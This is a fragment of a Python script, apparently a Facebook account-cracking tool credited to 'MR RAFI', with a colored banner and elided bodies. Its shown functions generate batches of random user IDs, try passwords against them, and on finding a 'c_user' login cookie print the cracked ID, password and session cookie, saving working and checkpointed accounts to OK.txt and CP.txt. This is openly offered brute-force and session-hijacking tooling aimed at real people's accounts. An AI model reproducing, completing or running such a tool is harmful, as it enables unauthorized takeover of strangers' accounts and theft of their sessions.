...
███████ ███████ ██    ██    ███████    V.1
\033[1;30m───────────────────────────────────────────
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m AUTHOR    : MR RAFI             
\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mFACEBOOK  : Rafi Chowdhury            
...
def Main():
        os.system("clear")
        os.system('xdg-open ')
        os.system('espeak -a 300 "WELCOME TO Akash RANDOM TOOLS"')
        print(logo)
...
def fuck():
    ...
    print('\n[+] EXAMPLE: 2000 3000 5000 10000 30000 50000 100000')
    ...
    print(' [+] OK Ids saved in Rafi/OK.txt')
    print(' [+] CP Ids saved in Rafi/CP.txt')
    print('•────────────────•°•❀•°•────────────────•')
def Akashsexy2(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[Akash-OK🔥🖤🍎] {uid}|{ps} \nCookie[🍒] : {coki}")
